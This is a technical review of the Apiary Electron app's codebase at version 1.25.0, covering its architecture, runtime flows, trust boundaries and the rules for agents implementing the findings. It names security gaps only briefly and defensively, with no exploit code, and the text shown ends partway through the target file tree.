# Apiary codebase and architecture review

- **Date:** 2026-09-26
- **Reviewed revision:** `8fc5fdf` (version 1.25.0). All `file:line` references are to this revision.
- **Scope:** the whole repository: `src/{main,preload,renderer,shared}`, `tests/`, build and CI
  configuration, `scripts/`, `CLAUDE.md`, `README.md` and `docs/`.
- **Method:** five parallel area reviews (security; main process and IPC; renderer; tests, tooling
  and CI; documentation, the shared layer and repository structure), followed by a lead review.
  The lead review consolidated overlapping findings, re-checked the highest-impact claims against
  the code, and wrote §2 to §5. Reviewers only read code and ran read-only commands. The
  checks run were `npm run typecheck` (passes), `npm run lint` (passes), `npm run test:component`
  (187/187 pass in 19.8 s), `npm audit`, `npm outdated` and `madge --circular` (no cycles).
  The full native-module and e2e suites were **not** run, because of the ABI trap described in
  `CLAUDE.md`.

## Contents

1. [How to use this document (read first if you are implementing)](#1-how-to-use-this-document)
2. [System architecture (as of 1.25.0)](#2-system-architecture-as-of-1250)
3. [Target architecture](#3-target-architecture)
4. [Executive summary](#4-executive-summary)
5. [Roadmap: phases and order of work](#5-roadmap-phases-and-order-of-work)
6. [Index of all findings](#6-index-of-all-findings)
7. [Part A: Security](#part-a-security)
8. [Part B: Main process, preload and IPC](#part-b-main-process-preload-and-ipc)
9. [Part C: Renderer](#part-c-renderer)
10. [Part D: Testability, test harness, tooling and CI](#part-d-testability-test-harness-tooling-and-ci)
11. [Part E: Documentation (CLAUDE.md), shared layer and repository structure](#part-e-documentation-claudemd-shared-layer-and-repository-structure)

## 1. How to use this document

This report is written so that a coding agent can pick up any finding and implement it without
re-investigating the problem. Each finding has the same fields:

| Field | Meaning |
| --- | --- |
| **Severity** | critical, high, medium or low: impact if left alone |
| **Effort** | S (under 2 h), M (half a day to 2 days), L (more). L items are split into S/M steps |
| **Evidence** | `file:line` references with a short quote, at revision `8fc5fdf` |
| **What / Why / Gain** | the proposal, the problem it solves, and what the project gets |
| **Implementation steps** | ordered, incremental steps. Each one leaves every test suite green |
| **Verification** | the tests to add and the commands that prove the work is done |
| **Constraints** | invariants from `CLAUDE.md` that the change must not break. **These are binding.** |
| **Depends on** | findings that should land first |

A line of the form **Lead review: ...** under a finding's heading records a consolidation
decision, or a claim the lead reviewer re-checked. Where it says "merged into X", implement the
work as part of X and use this finding only for its extra detail.

### 1.1 Rules for every change (from the maintainer and `CLAUDE.md`)

1. **Read `CLAUDE.md` first.** It records decisions that look like mistakes but are deliberate:
   indexing on the main thread, a preset-table layout, no `backdrop-filter`, the renderer never
   supplying paths, and others. Do not reverse a documented decision unless the finding
   explicitly argues why its reason no longer holds.
2. **One finding, or one step of a finding, per commit.** Every change is published, so every
   change bumps `package.json` `version` (patch or minor, per SemVer) and adds its own
   Keep-a-Changelog section in `CHANGELOG.md`. Never reuse the current version. The commit subject
   is a Conventional Commit that carries the version, for example
   `fix(ipc): 1.25.1 — reject a NaN transcript cursor`.
3. **No AI attribution** in commits or PRs. The `commit-msg` hook rejects it.
4. **Never push, tag or release without asking the maintainer.** A `v*` tag triggers the release
   workflow, and the maintainer tests builds by hand first.
5. **Native-module ABI trap** (until TEST-1 lands): always use the npm scripts, never bare
   `npx vitest` or `npx playwright`. Never run `npm test` and `npm run test:e2e` at the same time.
6. **Definition of done:** `npm run typecheck && npm run lint`, the tests in the cheapest layer
   that proves the change, and the e2e specs named in the finding's *Verification*.
7. **Measure before fixing** (CLAUDE.md). For every performance finding, record a before and after
   number and put it in the commit message or changelog.
8. **Line numbers drift.** If a reference no longer matches, locate the code by the quoted snippet
   or symbol name, not by line.

### 1.2 Overlapping findings and which one to implement

The area reviews overlap in a few places. Implement the **canonical** finding; the others add
detail.

| Topic | Canonical | Also covered by | Note |
| --- | --- | --- | --- |
| Pty and tab id helpers (`new:<uuid>`, `shell:<key>:<n>`) | MAIN-21 | UI-17, SHARED-3 (pty-id part) | One `src/shared/domain/tabs.ts` (or `ptyId.ts`). SHARED-3 keeps the `TabView`, `BUILTIN_THEME_PREFIX` and `LogScope` parts |
| Types duplicated between main and shared | MAIN-22 | SHARED-2 | Same work. SHARED-2 adds `AppSettings extends AppSettingsPayload` and `THEME_MODELS` |
| IPC runtime validation | MAIN-11 (registrar and guards) | SEC-8 | Land SEC-8 steps 2 (NaN), 5 (`reportLayout`) and 6 (`importSessions`) early as point fixes; the rest arrives with MAIN-11 |
| Settings merge and ownership | MAIN-16 | TEST-4 step 1, DOC-4 | Do TEST-4 step 1 (extract and unit-test `mergeSettingsPayload`) **before** MAIN-16 steps 2-5 |
| Injectable dependencies in `AppService` and `PtyManager` | MAIN-14 step 1 | TEST-6 | Same seam |
| Test hooks in packaged builds; `app/env.ts` | SEC-3 step 1 | MAIN-15 step 1 | Put the `app.isPackaged` gate inside `parseRuntimeEnv` |
| Electron 38 → 44, electron-builder 26 | SEC-1 | TEST-17 step 2, SEC-3 step 2 | TEST-1 first makes the ABI change painless |
| Release workflow | TEST-13 | SEC-4, TEST-12 | One restructure: verify → build (read-only token) → publish (write token, SHA-pinned, all-or-nothing) |
| Search text memory cap | SEC-12 step 1 | MAIN-24 bullet 3 | MAIN-24 keeps the incremental append indexing and LRU |
| Pty output fan-out | MAIN-26 (main side) | UI-10 (renderer `ptyBus`) | Independent halves; renderer first is cheaper |
| Git status polling | MAIN-9 (main cost) | UI-14 (renderer race) | Independent |
| Main-process folder layout | §3.2 of this report | MAIN-13, MAIN-14, MAIN-15, STRUCT-2 | §3.2 reconciles them into one tree |
| Renderer folder layout | UI-31 | STRUCT-3 | UI-31 has the file-by-file mapping |
| Dead `useDebouncedValue.ts` | UI-18 | TEST-19 | Delete once |
| `.nvmrc` | DOC-9 | TEST-1 step 6, TEST-12 | Add once |
| `coverage/` in `.gitignore` | TEST-3 | STRUCT-5 | Add once |
| Stale "replay buffer" docs | DOC-2 | MAIN-5 | If MAIN-5 deletes `replay()`, update CLAUDE.md in the same commit |

### 1.3 Claims the lead reviewer re-checked against the code

These were confirmed by reading the code directly. Nothing was executed.

- **SEC-2:** `decideNavigation` allows `file:` to `file:` with the same pathname whatever the
  query (`navigationGuard.ts:34`). `MarkdownText.tsx:20` calls `DOMPurify.sanitize(rendered)`
  with the default config.
- **SEC-8:** `readTranscriptPage` computes `end = Math.max(0, Math.min(beforeIndex ?? n, n))`
  (`transcriptReader.ts:188`), so a `NaN` cursor gives `NaN` bounds in the `for (;;)` loop.
- **MAIN-5:** no production code calls `.replay(` (`grep -rn "\.replay(" src` finds nothing). It
  is called only from tests.
- **MAIN-6:** the `onExit` handler (`ptyManager.ts:134-138`) deletes only `processes`. The
  headless screen buffer stays alive.
- **MAIN-16:** `saveSettings` is a plain `writeFileSync` (`settings.ts:195`), not tmp + rename.
- **MAIN-26:** the `send` helper broadcasts to every window (`ipc.ts:106-110`), and `ptyData` uses
  it (`ipc.ts:640`).
- **UI-12:** `<Composer>` (`SessionColumn.tsx:550`) has no `key`, and its parent `div` is not
  keyed per session. `Composer` holds `text`, `attachments` and `model` in `useState` with no reset
  effect.
- **UI-13:** the theme-name input handles Escape without `stopPropagation`
  (`ThemesSection.tsx:256`), and `SettingsDialog` closes on any document-level Escape
  (`SettingsDialog.tsx:115-123`).
- **TEST-8:** `launchAgainst` (`tests/e2e/helpers.ts:394-403`) relaunches with only
  `APIARY_CONFIG_ROOT`, `APIARY_DB_PATH` and `APIARY_FAKE_LIVE`.
- **TEST-13:** `release.yml` uses `fail-fast: false` with a per-leg upload to the release.
- **UI-23, correction:** `@typescript-eslint/no-floating-promises` is **already enabled**
  (`eslint.config.js:49`), with `ignoreVoid: true`. The gap is that `void p.then(...)` with no
  `catch` passes the rule. The fix is MAIN-19's `fireAndForget` helper, and optionally
  `ignoreVoid: false`. Adding the rule again is not the fix.

## 2. System architecture (as of 1.25.0)

This section is the overall picture: what runs where, what it owns, how data moves, and where the
trust boundaries are. It describes the code **as it is today**. §3 describes the target shape the
proposals move towards.

### 2.1 Processes and external systems

Apiary is one Electron app with three kinds of JavaScript context. It also has a helper thread and
several external programs that it drives but does not own.

```mermaid
flowchart LR
  subgraph APP["Apiary (Electron 38)"]
    direction TB
    subgraph REN["Renderer × N windows (Chromium, sandboxed, no Node)"]
      UI["React 18 UI<br/>App.tsx, Sidebar, SessionColumn ×≤4"]
      XV["xterm.js views<br/>(one per visible pty)"]
    end
    PRE["Preload<br/>contextBridge → window.apiary<br/>(typed ApiaryApi, ~99 channels)"]
    subgraph MAIN["Main process (Node)"]
      LIFE["index.ts<br/>lifecycle · windows · menu · restore"]
      IPCM["ipc.ts + theme/themeIpc.ts<br/>handlers · watcher · activity · tab moves"]
      SVC["AppService (facade, 57 methods)"]
      PTYM["PtyManager + ScreenBuffers<br/>(node-pty + headless xterm per pty)"]
      STORE["SessionStore<br/>(better-sqlite3)"]
      IDX["SearchIndex (indexing, main thread)"]
      TRK["ClaudeSessionTracker (1 s poll)"]
      UPD["UpdateService + backend"]
      THM["ThemeStore + ThemeGenerator"]
      PLG["PluginRegistry (GitLab MR)"]
    end
    WRK["Search worker thread<br/>(FTS5 queries only)"]
  end

  subgraph DISK["Local disk"]
    CP[("~/.claude/projects/&lt;slug&gt;/*.jsonl<br/>(Claude Code transcripts)")]
    CS[("~/.claude/sessions/&lt;pid&gt;.json")]
    UD[("userData/<br/>apiary.db · search.db · settings.json<br/>themes.json · session-layout.json<br/>logs/ · pasted-images/ · prompt-shim/")]
  end

  subgraph EXT["External programs"]
    SH["$SHELL -l → claude CLI / user shells"]
    GIT["git"]
    GLAB["glab"]
    CODE["VS Code 'code'"]
    PS["ps"]
    CLP["claude -p (theme generator)"]
  end
  GH["GitHub Releases<br/>(latest-*.yml + installers)"]

  UI <--> PRE
  XV <--> PRE
  PRE <-->|"ipcRenderer.invoke / send / on"| IPCM
  IPCM --> SVC
  SVC --> PTYM & STORE & IDX & PLG
  IPCM --> TRK
  LIFE --> IPCM & UPD & THM
  SVC <-->|"worker_threads"| WRK
  PTYM <-->|"pty"| SH
  SVC -->|"execFile"| GIT & CODE & PS
  PLG -->|"execFile"| GLAB
  THM -->|"spawn, no shell parsing"| CLP
  SVC -->|"scan, read"| CP
  IPCM -->|"chokidar watch, depth 2"| CP
  TRK -->|"poll"| CS
  STORE & IDX & WRK & THM & LIFE --> UD
  UPD -->|"HTTPS"| GH
```

Key facts that shape everything else:

- **The main process owns everything that touches the machine**: files, SQLite, ptys, git,
  child processes, the watcher. The renderer is a sandboxed Chromium page with no Node. It reaches
  main only through `window.apiary` (`src/preload/index.ts`), which is typed by `ApiaryApi` in
  `src/shared/api.ts`.
- **A pty belongs to main, not to a window.** Several windows can show the same pty. Output is
  broadcast to every window (`ipc.ts:106-110, 640`), and each `TerminalView` filters by id. A view
  that attaches late gets a *rendered snapshot* (`PtyManager.snapshot()`), not the raw byte history.
- **Two SQLite databases.** `apiary.db` is the source of truth for imported sessions, projects,
  notes and `cwd_override`. `search.db` is a rebuildable FTS5 index. It is written on the main
  thread, yielding between files, and queried from a worker thread so that a slow query cannot
  freeze input routing.
- **JSON files** hold settings (`settings.json`), themes (`themes.json`, atomic writes) and window
  and tab layout (`session-layout.json`, debounced 500 ms).
- **Claude Code is the data source, not a dependency.** Apiary reads Claude's JSONL transcripts and
  `sessions/<pid>.json` files. It launches `claude` through the user's login shell
  (`$SHELL -l -c 'exec claude --resume <uuid>'`).

### 2.2 Source layout and layering

```mermaid
flowchart TB
  subgraph RN["src/renderer (React, DOM, no Node)"]
    RAPP["App.tsx (1,622 lines: window state, tabs, panes, rekey, restore, dialogs)"]
    RCOMP["components/ (44 flat files)"]
    RSTATE["state/ (pure models + hooks)"]
    RTHEME["theme/ (applyTheme, ThemeEffects)"]
  end
  subgraph PL["src/preload"]
    PIDX["index.ts (hand-written bridge, 1 line per channel)"]
  end
  subgraph SHD["src/shared (pure, used by both sides)"]
    SAPI["api.ts (CHANNELS + ApiaryApi + payload types)"]
    STYPES["types.ts (domain types, validators)"]
    SPURE["activity · treeFilter · fuzzy · sessionRank · redact · mrRefs · gitMessages · ..."]
    STHEME["theme/ (spec, validate, cssVars, prompt, builtins, effects/)"]
  end
  subgraph MN["src/main (Node + Electron)"]
    MROOT["index.ts · ipc.ts · appService.ts (composition + service layer)"]
    MLEAF["pty/ store/ scanner/ search/ git/ plugins/ update/ theme/ transcript/ tree/ log/ live/ vscode/"]
    MWIN["windowAtPoint · windowBounds · sessionLayoutStore · sessionLayoutRestore · layoutFlushCoordinator · tabRegistry · navigationGuard"]
  end
  RN -->|"imports types + pure helpers"| SHD
  PL --> SHD
  MN --> SHD
  RN -.->|"window.apiary (IPC)"| PL
  PL -.->|"ipcRenderer"| MN
```

ESLint enforces the layering (`eslint.config.js:72-119`). The renderer cannot import `electron`,
`node:*` or main code, shared cannot import either side, and main cannot import the renderer.
There is one gap: shared is **not** barred from `node:*` imports (SHARED-5).

**Composition today.** `index.ts` builds the long-lived objects inside `app.whenReady()`
(`index.ts:386-515`) and passes them to `registerIpc(...)` as 11 positional arguments.
`AppService` then constructs its *own* `PtyManager`, `SessionStore`, `PluginRegistry` (with the
GitLab plugin hardcoded) and `SearchClient`. So there are two composition roots, and the second one
cannot be injected into (MAIN-14, MAIN-15).

### 2.3 Main-process module map

| Module | Owns | Notes |
| --- | --- | --- |
| `index.ts` | App lifecycle, window creation/numbering/bounds, menu, restore on launch, periodic rescan timer, updater construction, ordered shutdown | ~12 module-level `let` globals; reads 10 `APIARY_*` test hooks inline |
| `ipc.ts` | 66 `handle` + 6 `on` channels, settings merge, chokidar watcher, activity broadcast coalescing, cross-window tab moves, post-git-mutation rescans | Logging/timing wrapper `handle()` (`:58-95`) |
| `theme/themeIpc.ts` | 10 theme channels (bypasses the `handle()` wrapper) | Validates every arg as `unknown`, the model to copy |
| `appService.ts` | Refresh loop (scan → resolve → sync → live → auto-import → index), search and notes, session CRUD, transcripts, every pty spawn, 14 git delegations, MR refs, VS Code, pasted images, settings mutators | The trust boundary (`requireSession`, `requireFolder`, `resolveShellCwd`) lives here |
| `pty/ptyManager.ts`, `pty/screen.ts` | node-pty processes, 256 KB replay buffer (unused in prod), headless xterm per pty for `screen()`/`snapshot()`, prompt delivery waits | State in 9 parallel maps (MAIN-6) |
| `store/` | `apiary.db`: `project`, `session` (incl. `cwd_override`, notes) | WAL; rescans never write `cwd_override`/`project_path` |
| `scanner/` | Reads JSONL head/tail (64 KB each) → `SessionMeta` | Every file, every pass (MAIN-1) |
| `search/` | `search.db` FTS5 (`chunks`, `notes`, `indexed`), incremental indexer, worker client | `null` vs `[]` distinction |
| `git/` | `branchOps` (status, checkout, pull, push, merge, worktrees), `worktreeResolver` (3 spawns/folder), `mrStatusCache` | `execFile`, no shell |
| `plugins/` | `PluginRegistry` (stale-while-revalidate, fault isolation), `gitlabMr` via `glab` | Data-only contributions |
| `update/` | `UpdateService` policy behind `UpdateBackend`; capability (auto vs assisted); installer pick | SHA-512 check; unsigned mac → assisted .dmg |
| `claudeSessionTracker.ts`, `claudeRename.ts`, `live/` | Which Claude session a pty is on (`sessions/<pid>.json`), `/rename` delivery, `ps`-based live detection | |
| `tabRegistry.ts`, `sessionLayout*.ts`, `layoutFlushCoordinator.ts`, `windowAtPoint.ts` | Per-window tab reports, persisted layout, quit flush, geometric drop targeting | Pure, testable |
| `log/` | Opt-in diagnostic log, redaction inside the logger, rotation | Off means nothing is written |

### 2.4 Renderer composition

```mermaid
flowchart TB
  MAINTSX["main.tsx<br/>applyTheme(initialTheme) before first paint"] --> NP["NotificationProvider"]
  NP --> EB["ErrorBoundary 'Apiary'"] --> APP["App.tsx<br/>30 useState · 27 useEffect"]
  NP --> NC["NotificationCenter"]
  APP --> TE["ThemeEffects (canvas, 30/15 fps)"]
  APP --> UB["UpdateBanner"]
  APP --> SB["Sidebar (36 props)<br/>Active · Pinned · Recent · Pending · Results · Grouped tree"]
  SB --> ST["SessionTree → FolderHeader / SessionRow (+ HoverCard)"]
  APP --> LC["LayoutContext (preset table + tidyLayout)"]
  APP --> COL["SessionColumn × ≤4 panes (34 props each)<br/>each in its own ErrorBoundary"]
  COL --> TAB["SessionTabBar"]
  COL --> TR["Transcript → MessageRow → MarkdownText (marked + DOMPurify) / ToolBlock"]
  COL --> CMP["Composer"]
  COL --> TV["TerminalView (claude pty)"]
  COL --> SP["Shell pane: TerminalView × n · TerminalListPanel · Toolbar · GitMenu · BranchSwitcher · plugin bar"]
  APP --> DLG["Dialogs: Settings (+ Themes) · Import · Delete · Move · Note · Conflict"]
```

- **State.** Window state lives in `App.tsx` as separate `useState` maps (`openSessions`,
  `resumed`, `ptyOverrides`, `pending`, `shellTabs`, `activeTerminal`) plus one atomic
  `windowState` (layout + focused column). Pure models with unit tests sit in `state/`
  (`layout.ts`, `columns.ts`, `groups.ts`, ...). Per-window UI preferences are kept in
  `localStorage` (`state/uiState.ts`).
- **Data from main** arrives as push events (`treeChanged`, `activeTabsChanged`, `ptyData`,
  `ptySessionsChanged`, ...). Each consumer subscribes independently, and the tree is re-fetched by
  several consumers per change (UI-3).
- **Filtering** by title, path or branch runs locally against a cached tree. Only content and note
  search cross IPC (to the worker).

### 2.5 Key runtime flows

#### Startup and restore

```mermaid
sequenceDiagram
  autonumber
  participant E as Electron
  participant I as index.ts
  participant S as AppService
  participant IPC as ipc.ts
  participant W as BrowserWindow(s)
  E->>I: app.whenReady()
  I->>I: loadSettings + migrate, write back
  I->>I: configureLogging, detectVsCode
  I->>S: new AppService(options) builds PtyManager, SessionStore, PluginRegistry
  I->>I: createUpdater, registerThemeIpc(ThemeStore, ThemeGenerator)
  I->>IPC: registerIpc(service, ... 11 args) starts watcher + session tracker
  I->>S: await refresh() scans every JSONL, resolves every folder with git
  opt autoImportAll
    I->>S: importAllDiscovered()
  end
  I->>I: loadSessionLayout, pruneStaleLive
  I->>W: createWindow({restore}) per saved window, or one new window
  W->>W: preload sendSync themeInitial, then first paint in theme
  W->>IPC: tree(), activeTabs(), ptySessions(), ...
  I->>I: set menu, updater.start()
```

#### Watcher-driven rescan (the hottest background path)

```mermaid
sequenceDiagram
  participant C as Claude CLI
  participant FS as ~/.claude/projects
  participant CH as chokidar (ipc.ts)
  participant S as AppService.refresh
  participant SC as scanner
  participant G as git
  participant DB as apiary.db
  participant IX as search.db
  participant R as every window
  C->>FS: appends to session.jsonl
  FS-->>CH: change (awaitWriteFinish 500 ms)
  CH->>CH: debounce 1 s
  CH->>S: refresh()
  S->>SC: scanProjects(all) reads head+tail of EVERY jsonl
  S->>G: resolveProject(each cwd): 3 spawns per folder, cache cleared
  S->>DB: syncProject + syncSessions per project (2 commits each)
  S->>IX: updateSearchIndex (incremental by size/mtime) + resync all notes
  CH->>R: treeChanged
  R->>S: tree() (3-5 times per window, see UI-3)
```

While any session is active this loop runs roughly once a second, and its cost grows with the size
of the library, not with how much changed. That is why MAIN-1 to MAIN-4 and UI-3 are the top
performance items.

#### Resuming a session and terminal I/O

```mermaid
sequenceDiagram
  participant U as Renderer (SessionColumn/TerminalView)
  participant M as ipc.ts / AppService
  participant P as PtyManager
  participant SB as ScreenBuffers (headless xterm)
  participant SH as $SHELL -l to claude
  U->>M: checkConflict(id) then resume(id)
  M->>M: requireSession(id): cwd from store (never from renderer)
  alt pty already live
    M-->>U: attach (never spawn over a live id)
  else
    M->>P: spawn(id, "exec claude --resume uuid", cwd, childEnv)
    P->>SH: node-pty spawn
  end
  U->>M: ptySnapshot(id)
  M->>SB: serialize rendered screen
  M-->>U: snapshot + size
  U->>U: write snapshot, await parse, fit, then ptyResize
  loop output
    SH-->>P: data chunk
    P->>SB: write (for screen/snapshot/activity)
    P-->>U: ptyData(id, chunk) broadcast to ALL windows
  end
  U->>M: ptyWrite(id, keys)
  M->>P: write
  Note over M,P: sendPrompt waits for alt-screen (CSI ?1049h) and quiet output, then a bracketed paste and CR
```

#### Activity status (the dots in "Active")

`PtyManager.onData` feeds a coalescer in `ipc.ts` that broadcasts `activeTabsChanged` at most every
500 ms, on both the leading and trailing edge. Each window then calls `activeTabs()`. Main joins
`TabRegistry` (what each window reported) with `classifyActivity(screen(id), sinceLastOutput)`
(`shared/activity.ts`), which reads the **rendered** bottom 15 lines. The result is
`stopped | waiting | running | idle`.

#### Following Claude's session id

`ClaudeSessionTracker` polls `~/.claude/sessions/<pid>.json` once a second for live TUI ptys. When
`sessionId` changes (`/clear`, `/resume`) or a new session's JSONL appears, the renderer rekeys the
tab (`ptyOverrides`). Shells stay filed under the pty key. See CLAUDE.md "Which session a
terminal is on".

#### Content search

```mermaid
sequenceDiagram
  participant SF as SearchField (debounced 150 ms)
  participant T as useTree
  participant S as AppService.searchSessions
  participant SC as SearchClient
  participant WK as searchWorker (thread)
  SF->>T: settled query
  T->>T: filterTreeLocal (titles, paths, branches) instantly
  T->>S: searchContent(query) (only for 3+ char prefixes)
  S->>SC: search(toMatchQuery(q))
  SC->>WK: postMessage
  WK-->>SC: ids, or null if the worker is unavailable
  SC-->>T: ids merged into local results (null means it never ran, not empty)
```

#### Cross-window tab drag

An HTML5 drag delivers **no events** to another `BrowserWindow`. The originating window's
`dragend` sends `tabDropped(screenPoint)`. Main hit-tests window bounds (`windowAtPoint.ts`),
then tells the receiving window to adopt the tab (`tabAdopt`, carrying a `TabTransfer` with the pty
id, view and shells), or opens a detached window (`?detach=&transfer=` in the URL).

#### Updates

`UpdateService` (policy, timers, skip/dismiss) sits over an `UpdateBackend` (electron-updater +
own HTTPS download). Capability is decided up front. A Linux AppImage updates itself (`auto`).
An unsigned macOS build and a Linux `.deb` use the `assisted` path: download, verify SHA-512 from
`latest-*.yml`, then open or reveal for the user.

### 2.6 Background work and timers

| What | Where | Cadence | Cost today |
| --- | --- | --- | --- |
| Transcript watcher → full refresh | `ipc.ts:673-686` | every change, 500 ms settle + 1 s debounce | all JSONL head/tail + 3 git spawns per folder + 2 commits per project (MAIN-1/2/3) |
| Periodic rescan (opt-in) | `index.ts:59-86` | user interval | same full refresh; notifies the front window only (MAIN-12) |
| Session tracker | `claudeSessionTracker.ts:69` | 1 s | reads `sessions/<pid>.json` for live TUI ptys |
| Activity broadcast | `ipc.ts:643-671` | ≤ every 500 ms while output flows | every window calls `activeTabs()` and re-renders App (UI-4) |
| Git status poll | `SessionColumn.tsx:170-177` | 5 s per pane, focused window only | 4 sequential git spawns per pane (MAIN-9) |
| MR ref status | `useMrStatuses.ts:21-35` | 2 min per row that mentions `!123` | one IPC per row per tick (UI-10) |
| Plugin bar | `plugins/registry.ts` | stale-while-revalidate per folder+branch | `glab` + `git remote` per evaluation |
| Update check | `updateService.ts` | configurable hours (clamped) | HTTPS to GitHub |
| Layout persistence | renderer 500 ms + `sessionLayoutStore` 500 ms | on change | JSON write (not atomic, MAIN-16) |
| Settings write | `index.ts:227-234` | every window move/resize | read + parse + write, not atomic (MAIN-10/16) |

### 2.7 Persistent state

| File (userData unless noted) | Owner | Format | Rebuildable? |
| --- | --- | --- | --- |
| `~/.claude/projects/<slug>/<uuid>.jsonl` | Claude Code (Apiary only moves files, `moveSession`) | JSONL | n/a (source data) |
| `~/.claude/sessions/<pid>.json` | Claude Code | JSON | n/a |
| `apiary.db` (+ `-wal`) | `store/sessionStore.ts` | SQLite, WAL, `synchronous=FULL` | **No**: imports, notes, `cwd_override`, auto-import flags |
| `search.db` | `search/searchIndex.ts` | SQLite FTS5, WAL, `NORMAL` | Yes (Settings → rebuild) |
| `settings.json` | `settings.ts` (`SETTINGS_VERSION`, `migrateSettings`) | JSON, whole-object writes | No |
| `themes.json` | `theme/themeStore.ts` | JSON, atomic tmp+rename | No (custom themes) |
| `session-layout.json` | `sessionLayoutStore.ts` | JSON keyed by window number | Yes (loses layout) |
| `pasted-images/` | `AppService.saveImage` | files, MIME allowlist, 20 MB cap | No |
| `prompt-shim/zsh` | `pty/promptPath.ts` | rewritten each launch | Yes |
| `logs/` | `log/` (opt-in) | JSON lines, rotated | Yes |

### 2.8 Trust boundaries

| Boundary | Rule the code holds to | Where enforced | Gaps found |
| --- | --- | --- | --- |
| Renderer → main (IPC) | The renderer never supplies a filesystem path; ids are resolved in main | `requireSession`, `requireFolder`, `resolveShellCwd`, `readImage` confinement | `importSessions` takes paths (SEC-8); most handlers don't validate types or ranges (SEC-8, MAIN-11); `transcript(id, NaN)` loops forever |
| Transcript content → DOM | Markdown only through DOMPurify; no other HTML sink | `MarkdownText.tsx` | Default DOMPurify config allows `<style>`, `<form>`, popovers; relative links can reload the window with `?restore=` (SEC-2) |
| Window navigation | Only the app page; http(s)/mailto go to the OS browser | `navigationGuard.ts` | Same-path + new query is allowed (SEC-2) |
| Theme data → CSS | Themes are data; `validateTheme` is the only entry | `shared/theme/validate.ts`, `themeStore`, `themeIpc` | none found |
| Plugins → UI | Data only (closed icon/action sets), URLs re-checked in main | `plugins/*`, `ipc.ts:419-437` | none found |
| Spawns | `execFile`/`spawn` with argument arrays; UUID-checked resume; `exec "$0" "$@"` in the theme generator | `resumeCommand.ts`, `themeGenerator.ts`, `branchOps.ts` | No `--end-of-options` on ref arguments (SEC-9) |
| Paste → pty | Multi-line prompts are bracketed pastes | `sendPrompt`, `terminalPaste.ts` | Payload can contain `ESC[201~` and escape the bracket (SEC-6) |
| Update feed → installed app | HTTPS + SHA-512 from `latest-*.yml` | `electronUpdaterBackend.ts` | Hash and file come from the same release; no signature (SEC-4, SEC-5, SEC-7) |
| Environment → packaged app | (none) | none | `APIARY_*` test hooks and `ELECTRON_RENDERER_URL` are live in packaged builds; no Electron fuses (SEC-3) |
| Logs → whoever reads them | Conversation content is never logged; redaction inside the logger | `log/logger.ts`, `shared/redact.ts` | URL credentials and some token shapes are not redacted (SEC-11) |

## 3. Target architecture

The proposals converge on the shape below. None of it needs a rewrite: every step is an
extraction behind the existing public surface, so the test suites keep passing throughout. The
target file tree in §3.2 reconciles the directory proposals from the main-process (MAIN-13/14/15),
renderer (UI-31) and structure (STRUCT-2/3, SHARED-1) reviews into one layout.

### 3.1 Target runtime shape

```mermaid
flowchart TB
  subgraph R["Renderer"]
    APPT["app/App.tsx (~250 lines): providers + grid"]
    WS["features/workspace<br/>workspaceReducer (pure) + WorkspaceProvider<br/>+ useSessionFollowing, usePtyLifecycle, useLaunchRestore, useTabTransfer"]
    STORES["state/ external stores (useSyncExternalStore)<br/>treeStore · ptyBus · activeTabs · mrStatusStore · themeStore"]
    FEAT["features/: sidebar · pane · transcript · terminal · git · layout · settings (section registry) · themes · dialogs · update"]
    UIP["ui/: Modal · Menu · useEscape · useResizeDrag · ErrorBoundary · icons · notifications"]
    APPT --> WS & FEAT
    FEAT --> STORES & UIP & WS
  end
  subgraph SH["Shared"]
    CONTRACT["shared/ipc/contract.ts<br/>ONE typed channel map + guards<br/>→ derives ApiaryApi, CHANNELS, preload, handler types"]
    DOMAIN["shared/domain/*: session, git, tabs (ptyId helpers), settings, update, plugins, log"]
  end
  P["Preload (~25 lines, generated from the contract)"]
  subgraph M["Main"]
    ROOT["app/: env.ts (all test hooks, ignored when packaged) · container.ts · lifecycle.ts"]
    REG["ipc/registrar.ts: typed handle/on, runtime validation, sender check, logging"]
    HND["ipc/handlers/*: thin adapters per domain"]
    SVCS["services: SessionCatalog · SessionActions · SessionResolver (trust boundary) · TerminalService · GitService · SearchService · PluginService · SettingsService · ImageStore"]
    INFRA["infra: PtyManager (PtyEntry per pty) · SessionStore · SearchIndex · exec/run.ts · SessionWatcher (path-scoped) · WindowManager (emit/broadcast) · TabMover · ActivityBroadcaster"]
    ROOT --> REG --> HND --> SVCS --> INFRA
  end
  R -.->|"window.apiary"| P
  P -.->|"IPC"| REG
  R --> SH
  M --> SH
```

Properties this buys:

- **One source of truth for IPC.** Adding a call goes from six edits (three of them boilerplate) to
  three: the contract entry, the handler and the fake. It is compile-checked end to end and
  validated at runtime in one place.
- **Services with injected dependencies.** Each service can be tested with fakes. The trust
  boundary lives in one file (`SessionResolver`).
- **Incremental background work.** A watcher event costs O(files changed), not O(library size).
- **A renderer with atomic, pure, Node-testable state transitions** (reducer), and with shared
  stores for data pushed from main. Memoised lists re-render only what changed.
- **Clear feature ownership in the file tree**, with a nested `CLAUDE.md` beside each subsystem.

### 3.2 Target file tree (directory level)

```text
apiary/
├── CLAUDE.md                      ~130 lines: commands, never-do list, DoD, versioning, map, hard rules, recipes
├── CONTRIBUTING.md  LICENSE  .nvmrc                                   (new, DOC-9)
├── docs/
│   ├── architecture/              boundaries · windows-and-tabs · activity · session-following (DOC-1)
│   ├── adr/                       decisions where an alternative was tried and rejected (DOC-10)
│   ├── reviews/                   this report
│   ├── testing.md · debugging.md · packaging.md
│   └── superpowers/ (+ README.md index, "historical, code wins")        (DOC-8, option B)
├── scripts/                       build/dev tools; screenshot/ holds the README screenshot spec + fake-claude
├── src/
│   ├── main/
│   │   ├── index.ts               entry stays here (build config points at it)
│   │   ├── app/                   env.ts · container.ts · lifecycle.ts · menu.ts · config.ts
│   │   ├── ipc/                   registrar.ts · handlers/{sessions,terminals,git,settings,tabs,plugins,update,log,theme}.ts
│   │   ├── windows/               windowManager · tabMover · windowAtPoint · windowBounds · sessionLayoutStore/Restore · layoutFlushCoordinator · tabRegistry · navigationGuard
│   │   ├── sessions/              sessionCatalog · sessionActions · sessionResolver · sessionWatcher · sources/claudeProjects
│   │   ├── terminals/             terminalService · activityBroadcaster
│   │   ├── claude/                claudeSessionTracker · claudeRename · live/
│   │   ├── settings/              settingsService (+ migrations)
│   │   ├── exec/                  run.ts (one execFile wrapper)
│   │   └── git/ log/ plugins/ pty/ scanner/ search/ store/ theme/ transcript/ tree/ update/ vscode/ media/
│   ├── preload/index.ts           generated from the contract
│   ├── renderer/
│   │   ├── main.tsx · index.html · styles.css (@imports styles/*.css partials)
│   │   ├── app/                   App.tsx · providers.tsx
